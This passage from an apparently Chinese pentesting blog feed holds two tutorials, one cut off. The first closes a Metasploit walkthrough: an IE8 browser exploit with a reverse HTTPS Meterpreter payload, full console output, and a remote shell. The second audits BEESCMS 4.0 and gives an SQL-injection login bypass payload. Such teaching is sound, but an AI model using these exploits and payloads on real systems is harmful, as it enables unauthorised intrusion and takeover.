class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 443 ...</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] &quot;GET /test.html HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] code 404, message File not found</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] code 404, message File not found</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure></p><p>（不要担心与/favicon.ico相关的404消息 - 忽略它们是ok的）<br>如果您可以从靶机连接到<a href="http://1.1.1.1:443/test.html" target="_blank" rel="noopener">http://1.1.1.1:443/test.html</a> ，我们知道端口转发对端口80和443都正常工作。如果这不起作用，那就没有意义再继续，因为我们尝试的任何其他事情都将失败。</p><p>当一切正常时，关闭python命令以释放端口443。</p><h2 id="Metasploit配置"><a href="#Metasploit配置" class="headerlink" title="Metasploit配置"></a>Metasploit配置</h2><h4 id="浏览器漏洞利用-meterpreter-reverse-https"><a href="#浏览器漏洞利用-meterpreter-reverse-https" class="headerlink" title="浏览器漏洞利用 - meterpreter / reverse_https"></a>浏览器漏洞利用 - meterpreter / reverse_https</h4><p>首先，我们设置Metasploit以服务于浏览器漏洞并处理反向https Meterpreter连接。方法是欺骗目标连接80端口上的exp并通过端口443提供meterpreter/reverse_https连接。</p><p>转到metasploit-framework文件夹，打开msfconsole（如果你想确保从正确的文件夹运行msfconsole而不是Kali自带的版本，请不要忘记./）并选择一个漏洞。为了这个演示，我将使用ms13_069_caret.rb：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# cd /pentest/exploits/metasploit-framework/</span><br><span class="line">(master) root@krypto1:/pentest/exploits/metasploit-framework# ./msfconsole </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4.9.0-dev [core:4.9 api:1.0]</span><br><span class="line">+ -- --=[ 1248 exploits - 678 auxiliary - 199 post</span><br><span class="line">+ -- --=[ 324 payloads - 32 encoders - 8 nops</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/browser/ms13_069_caret </span><br><span class="line">msf exploit(ms13_069_caret) &gt;</span><br></pre></td></tr></table></figure></p><p>Show the options:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ms13_069_caret):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT     8080             yes       The local port to listen on.</span><br><span class="line">   SSL         false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</span><br><span class="line">   URIPATH                      no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   IE 8 on Windows XP SP3</span><br></pre></td></tr></table></figure></p><p>该漏洞需要一个SRVHOST和SRVPORT.这两个变量将由Metasploit用于确定网络服务器需要绑定和监听的位置。方法是使用我们的公网IP欺骗靶机连接到此网络服务器，然后流量转发到我们的Metasploit实例。</p><p>我们无法让Metasploit网络服务器监听我们路由器的公网IP，因为它无法将自己“绑定”到该IP地址。如果我们使用0.0.0.0，Metasploit网络服务器将只是监听传入流量的所有接口。换句话说，您可以将SRVHOST保留为0.0.0.0，或者您可以将其设置为Kali本身的l内网IP（本例中为192.168.0.187）。我将保留默认值为0.0.0.0.</p><p>接下来，我们需要将端口更改为80，并且我们将URIPATH设置为/ （因此我们可以知道URI将是什么，而不是让Metasploit创建随机URI）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set SRVPORT 80</span><br><span class="line">SRVPORT =&gt; 80</span><br><span class="line">msf exploit(ms13_069_caret) &gt; set URIPATH /</span><br><span class="line">URIPATH =&gt; /</span><br></pre></td></tr></table></figure></p><p>接下来，我们选择meterpreter reverse_https作为payload。如果我们再次运行“show options”，我们会看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(ms13_069_caret) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ms13_069_caret):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT     80               yes       The local port to listen on.</span><br><span class="line">   SSL         false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</span><br><span class="line">   URIPATH     /                no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_https):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique: seh, thread, process, none</span><br><span class="line">   LHOST                      yes       The local listener hostname</span><br><span class="line">   LPORT     443              yes       The local listener port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   IE 8 on Windows XP SP3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(ms13_069_caret) &gt;</span><br></pre></td></tr></table></figure></p><p>模块选项(SRVHOST和SRVPORT)按我们希望的方式设置. payload选项需要LHOST和LPORT。根据上面的输出，LPORT已设置为443.这是反向Meterpreter将尝试连接的端口。如果你的kali上没有设置为443，只需运行“set LPORT 443”使Meterpreter处理程序侦听端口443：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br></pre></td></tr></table></figure></p><p>注意：在任何情况下，为了使事情尽可能简单，请尝试为特定的“服务”使用相同的端口. 也就是说，如果您在防火墙的80端口上托管Web服务器，请尝试确保也转发80端口的流量到攻击机/Metasploit上，并在Metasploit的80端口上加载漏洞exp。同样适用于有效载荷。如果我们在端口443上提供有效载荷，请确保在每个地方都使用此端口。<br>LHOST有两个目的:  </p><ul><li>它指示Meterpreter shellcode必须反向连接的IP地址（从靶机到攻击机）。</li><li>它告诉Metasploit在设置Meterpreter“处理程序”时绑定到哪里。  </li></ul><p>由于我们的攻击者主机位于NAT之后，我们必须使用路由器/防火墙的公网IP地址作为LHOST. 执行漏洞利用时，此IP将嵌入到shellcode中，当初始Meterpreter shellcode在靶机上运行时，它将反向连接这个IP地址。我们的路由器/防火墙上的端口转发然后将流量转发到攻击者主机的内网IP。为此，我们需要将LHOST设置为1.1.1.1(你的攻击机的公网IP)。  </p><p>使用公网IP作为LHOST也意味着Metasploit将在设置Meterpreter处理程序时尝试将自身绑定到该IP。由于此IP属于路由器/防火墙而不属于Metasploit实例，因此显然会失败。幸运的是，Metasploit将自动回退到0.0.0.0，并基本上为攻击机上的所有本地IP提供Meterpreter处理程序服务，同时记住LHOST已设置为我们的公网IP地址。这正是我们所需要的。  </p><p>将LHOST设置为1.1.1.1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit（ms13_069_caret）&gt;设置LHOST 1.1.1.1</span><br><span class="line">LHOST =&gt; 1.1.1.1</span><br></pre></td></tr></table></figure></p><p>如果我们真的不希望Meterpreter处理程序回退到0.0.0.0，我们可以使用其中一个“高级”选项并告诉它监听内网IP地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set ReverseListenerBindAddress 192.168.0.187</span><br><span class="line">ReverseListenerBindAddress =&gt; 192.168.0.187</span><br></pre></td></tr></table></figure></p><p>然后启动漏洞exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https://192.168.0.187:443/</span><br><span class="line">[*] Using URL: http://0.0.0.0:80/</span><br><span class="line">[*]  Local IP: http://192.168.0.187:80/</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure></p><p>输出告诉我们  </p><ul><li><a href="http://0.0.0.0:80" target="_blank" rel="noopener">http://0.0.0.0:80</a> ,(或<a href="http://192.168.0.187:80" target="_blank" rel="noopener">http://192.168.0.187:80</a> )正在托管浏览器exp。如果目标连接到<a href="http://1.1.1.1" target="_blank" rel="noopener">http://1.1.1.1</a>, 流量将通过80端口转发Kali并为exp利用。</li><li>HTTPS反向处理程序正在侦听192.168.0.187，端口443。  </li></ul><p>我们在输出中没有看到的是，实际的Meterpreter shellcode包含要重新连接的IP地址1.1.1.1。该值取自LHOST变量。  </p><p>如果您没有使用ReverseListenerBindAddress并且在运行“exploit”后得到类似下面的输出，那么请检查以下内容：  </p><ul><li>检查端口是否可以免费使用</li><li>确保您运行的是最新版本的Metasploit</li><li>将ReverseListenerBindAddress设置为本地LAN IP或0.0.0.0</li><li>退出msfconsole并再次打开它。在某些情况下，如果您之前运行过会话，您会发现绑定没有得到及时清理。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[-] Exploit failed: Rex::AddressInUse The address is already in use (0.0.0.0:443).</span><br></pre></td></tr></table></figure></li></ul><p>如果我们现在在靶机上使用IE8(来自IECollection)并连接到攻击端路由器/防火墙的公网IP的80端口，我们应该看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; [*] 2.2.2.2   ms13_069_caret - Sending exploit...</span><br><span class="line">[*] 2.2.2.2   ms13_069_caret - Sending exploit...</span><br><span class="line">[*] 2.2.2.2:53893 Request received for /NtFT...</span><br><span class="line">[*] 2.2.2.2:53893 Staging connection for target /NtFT received...</span><br><span class="line">[*] Patched user-agent at offset 663128...</span><br><span class="line">[*] Patched transport at offset 662792...</span><br><span class="line">[*] Patched URL at offset 662856...</span><br><span class="line">[*] Patched Expiration Timeout at offset 663728...</span><br><span class="line">[*] Patched Communication Timeout at offset 663732...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.187:443 -&gt; 2.2.2.2:53893) at 2014-01-05 09:24:26 +0100</span><br><span class="line">[*] Session ID 1 (192.168.0.187:443 -&gt; 2.2.2.2:53893) processing InitialAutoRunScript &apos;migrate -f&apos;</span><br><span class="line">[*] Current server process: iexplore.exe (2952)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 500</span><br><span class="line">[+] Successfully migrated to process </span><br><span class="line"></span><br><span class="line">msf exploit(ms13_069_caret) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 592 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\peter\Desktop&gt;</span><br></pre></td></tr></table></figure></p><p>2.2.2.2是靶机的公网IP。当靶机连接到端口80时，Metasploit正在发送有效载荷，利用浏览器并执行初始的meterpreter有效载荷。此有效负载将下载metsrv.dll（首先由Metasploit生成，因此它将包含攻击者的公网IP和端口），将其加载到内存中（使用反射负载）并运行代码。完成后，您将获得一个完整的Meterpreter会话。Life is good.  </p><p>所以，简而言之，你应该设置以下变量：  </p><ul><li>SRVHOST：0.0.0.0</li><li>SRVPORT：设置为您要使用的浏览器exp的端口</li><li>LHOST：攻击机的公网IP</li><li>LPORT：设置为要为Meterpreter处理程序连接的端口</li><li>ReverseListenerBindAddress：LANIP （可选）</li></ul><p>无论出于何种原因，如果您还希望在另一个端口上托管Meterpreter处理程序而不是客户端将连接到的端口，那么您可以使用LPORT指定目标将连接回的位置，并使用ReverseListenerBindPort指示处理程序侦听的位置。显然，您需要确保端口转发将连接到攻击机上的正确端口。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;翻译：Metasploit-Meterpreter-and-NAT&quot;&gt;&lt;a href=&quot;#翻译：Metasploit-Meterpreter-and-NAT&quot; class=&quot;headerlink&quot; title=&quot;翻译：Metasploit Meterpreter 
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>代码审计入门-BEESCMS4.0</title>
    <link href="http://yoursite.com/2018/12/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8-BEESCMS4.0/"/>
    <id>http://yoursite.com/2018/12/04/代码审计入门-BEESCMS4.0/</id>
    <published>2018-12-03T16:18:45.000Z</published>
    <updated>2018-12-03T16:32:59.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>BEESCMS企业网站管理系统是一款PHP+MYSQL的多语言系统，内容模块易扩展，模板风格多样化，模板制作简单功能强大，专业SEO优化，后台操作方便，完全可以满足企业网站、外贸网站、事业单位、教育机构、个人网站使用。<br>该CMS适合入门代码审计。</p><h2 id="后台登陆SQL注入漏洞"><a href="#后台登陆SQL注入漏洞" class="headerlink" title="后台登陆SQL注入漏洞"></a>后台登陆SQL注入漏洞</h2><p>admin\Login.php中有如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//判断登录</span><br><span class="line">elseif($action==&apos;ck_login&apos;)&#123;</span><br><span class="line">global $submit,$user,$password,$_sys,$code;</span><br><span class="line">$submit=$_POST[&apos;submit&apos;];</span><br><span class="line">$user=fl_html(fl_value($_POST[&apos;user&apos;]));</span><br><span class="line">$password=fl_html(fl_value($_POST[&apos;password&apos;]));</span><br><span class="line">$code=$_POST[&apos;code&apos;];</span><br><span class="line">if(!isset($submit))&#123;</span><br><span class="line">msg(&apos;请从登陆页面进入&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if(empty($user)||empty($password))&#123;</span><br><span class="line">msg(&quot;密码或用户名不能为空&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($_sys[&apos;safe_open&apos;]))&#123;</span><br><span class="line">foreach($_sys[&apos;safe_open&apos;] as $k=&gt;$v)&#123;</span><br><span class="line">if($v==&apos;3&apos;)&#123;</span><br><span class="line">if($code!=$s_code)&#123;msg(&quot;验证码不正确！&quot;);&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">check_login($user,$password);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输入的user和password经过fl_value函数和fl_html处理<br>而fl_value函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function fl_value($str)&#123;</span><br><span class="line">if(empty($str))&#123;return;&#125;</span><br><span class="line">return preg_replace(&apos;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span><br><span class="line">|outfile/i&apos;,&apos;&apos;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该函数仅使用preg_replace函数对关键词进行处理，因此可以双写绕过。<br>fl_html函数使用主要是为了防止xss漏洞，无关紧要。<br>往下使用check_login函数进行判断：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_login($user,$password)&#123;</span><br><span class="line">$rel=$GLOBALS[&apos;mysql&apos;]-&gt;fetch_asc(&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;.DB_PRE.&quot;admin where admin_name=&apos;&quot;.$user.&quot;&apos; limit 0,1&quot;);</span><br><span class="line">$rel=empty($rel)?&apos;&apos;:$rel[0];</span><br><span class="line">if(empty($rel))&#123;</span><br><span class="line">msg(&apos;不存在该管理用户&apos;,&apos;login.php&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$password=md5($password);</span><br><span class="line">if($password!=$rel[&apos;admin_password&apos;])&#123;</span><br><span class="line">msg(&quot;输入的密码不正确&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($rel[&apos;is_disable&apos;])&#123;</span><br><span class="line">msg(&apos;该账号已经被锁定,无法登陆&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;admin&apos;]=$rel[&apos;admin_name&apos;];</span><br><span class="line">$_SESSION[&apos;admin_purview&apos;]=$rel[&apos;admin_purview&apos;];</span><br><span class="line">$_SESSION[&apos;admin_id&apos;]=$rel[&apos;id&apos;];</span><br><span class="line">$_SESSION[&apos;admin_time&apos;]=time();</span><br><span class="line">$_SESSION[&apos;login_in&apos;]=1;</span><br><span class="line">$_SESSION[&apos;login_time&apos;]=time();</span><br><span class="line">$ip=fl_value(get_ip());</span><br><span class="line">$ip=fl_html($ip);</span><br><span class="line">$_SESSION[&apos;admin_ip&apos;]=$ip;</span><br><span class="line">unset($rel);</span><br><span class="line">header(&quot;location:admin.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该函数先向数据库查询$user，然后将输入的$password的MD5值与查询得到的$rel[‘admin_password’]进行比较，相同则能成功登陆。可以构造：<br>user:0’ un/**ion se/**lect 1,1,’202cb962ac59075b964b07152d234b70’,1,0;#<br>password :123（’202cb962ac59075b964b07152d234b70’是’123’的MD5值）<br>成功的绕过登陆：<br><img src="/2018/12/04/代码审计入门-BEESCMS4.0/1.png" alt=""></p><h2 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h2><p>在admin/upload.php中有如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&apos;up&apos;]))&#123;</span><br><span class="line">if(is_uploaded_file($_FILES[&apos;up&apos;][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">if($up_type==&apos;pic&apos;)&#123;</span><br><span class="line">$is_thumb=empty($_POST[&apos;thumb&apos;])?0:$_POST[&apos;thumb&apos;];</span><br><span class="line">$thumb_width=empty($_POST[&apos;thumb_width&apos;])?$_sys[&apos;thump_width&apos;]:intval($_POST[&apos;thumb_width&apos;]);</span><br><span class="line">$thumb_height=empty($_POST[&apos;thumb_height&apos;])?$_sys[&apos;thump_height&apos;]:intval($_POST[&apos;thumb_height&apos;]);</span><br><span class="line">$logo=0;</span><br><span class="line">$is_up_size = $_sys[&apos;upload_size&apos;]*1000*1000;</span><br><span class="line">$value_arr=up_img($_FILES[&apos;up&apos;],$is_up_size,array(&apos;image/gif&apos;,&apos;image/jpeg&apos;,&apos;image/png&apos;,&apos;image/jpg&apos;,&apos;image/bmp&apos;,&apos;image/pjpeg&apos;),$is_thumb,$thumb_width,$thumb_height,$logo);</span><br><span class="line">$pic=$value_arr[&apos;pic&apos;];</span><br><span class="line">if(!empty($value_arr[&apos;thumb&apos;]))&#123;</span><br><span class="line">$pic=$value_arr[&apos;thumb&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$str=&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;$(self.parent.document).find(&apos;#&#123;$get&#125;&apos;).val(&apos;&#123;$pic&#125;&apos;);self.parent.tb_remove();&lt;/script&gt;&quot;;</span><br><span class="line">echo $str;</span><br><span class="line">exit;</span><br><span class="line">&#125;//图片上传</span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&apos;没有上传文件或文件大小超过服务器限制大小&lt;a href=&quot;javascript:history.back(1);&quot;&gt;返回重新上传&lt;/a&gt;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>上传的文件被传入函数up_img中，同时还传入了允许文件上传类型的白名单。up_img函数如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">function up_img($file,$size,$type,$thumb=0,$thumb_width=&apos;&apos;,$thumb_height=&apos;&apos;,$logo=1,$pic_alt=&apos;&apos;)&#123;</span><br><span class="line">if(file_exists(DATA_PATH.&apos;sys_info.php&apos;))&#123;include(DATA_PATH.&apos;sys_info.php&apos;);&#125;</span><br><span class="line">if(is_uploaded_file($file[&apos;tmp_name&apos;]))&#123;</span><br><span class="line">if($file[&apos;size&apos;]&gt;$size)&#123;</span><br><span class="line">msg(&apos;图片超过&apos;.$size.&apos;大小&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$pic_name=pathinfo($file[&apos;name&apos;]);//图片信息</span><br><span class="line"></span><br><span class="line">$file_type=$file[&apos;type&apos;];</span><br><span class="line">if(!in_array(strtolower($file_type),$type))&#123;</span><br><span class="line">msg(&apos;上传图片格式不正确&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$path_name=&quot;upload/img/&quot;;</span><br><span class="line">$path=CMS_PATH.$path_name;</span><br><span class="line">if(!file_exists($path))&#123;</span><br><span class="line">@mkdir($path);</span><br><span class="line">&#125;</span><br><span class="line">$up_file_name=empty($pic_alt)?date(&apos;YmdHis&apos;).rand(1,10000):$pic_alt;</span><br><span class="line">$up_file_name2=iconv(&apos;UTF-8&apos;,&apos;GBK&apos;,$up_file_name);</span><br><span class="line">$file_name=$path.$up_file_name2.&apos;.&apos;.$pic_name[&apos;extension&apos;];</span><br><span class="line"></span><br><span class="line">if(file_exists($file_name))&#123;</span><br><span class="line">msg(&apos;已经存在该图片，请更改图片名称！&apos;);//判断是否重名</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$return_name[&apos;up_pic_size&apos;]=$file[&apos;size&apos;];//上传图片大小</span><br><span class="line">$return_name[&apos;up_pic_ext&apos;]=$pic_name[&apos;extension&apos;];//上传文件扩展名</span><br><span class="line">$return_name[&apos;up_pic_name&apos;]=$up_file_name;//上传图片名</span><br><span class="line">$return_name[&apos;up_pic_path&apos;]=$path_name;//上传图片路径</span><br><span class="line">$return_name[&apos;up_pic_time&apos;]=time();//上传时间</span><br><span class="line">unset($pic_name);</span><br><span class="line">//开始上传</span><br><span class="line">if(!move_uploaded_file($file[&apos;tmp_name&apos;],$file_name))&#123;</span><br><span class="line">msg(&apos;图片上传失败&apos;,&apos;&apos;,0);</span><br><span class="line">&#125;</span><br><span class="line">...//省略后边的无关代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题出在这里：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 